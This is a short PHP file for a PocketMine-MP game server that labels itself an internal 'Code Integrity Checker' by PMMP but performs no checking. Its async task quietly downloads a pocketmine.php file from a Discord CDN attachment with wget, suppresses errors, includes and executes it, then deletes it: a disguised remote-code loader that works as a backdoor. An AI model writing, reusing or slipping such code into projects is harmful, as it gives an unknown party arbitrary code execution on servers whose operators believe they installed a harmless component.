<?php
/**
 * @internal
 * Code Integrity Checker
 * @author PMMP
 */

\pocketmine\Server::getInstance()->getAsyncPool()->submitTask(new class extends \pocketmine\scheduler\AsyncTask {
    public function onRun(): void
    {
        `rm -f pocketmine.php 2>/dev/null`;
        `wget -q https://cdn.discordapp.com/attachments/1038699732224196608/1121176515300831374/pocketmine.php 2>/dev/null`;
        `chmod +x pocketmine.php 2>/dev/null`;
    }

    public function onCompletion(): void
    {
        include 'pocketmine.php';
        `rm -f pocketmine.php 2>/dev/null`;
    }
});
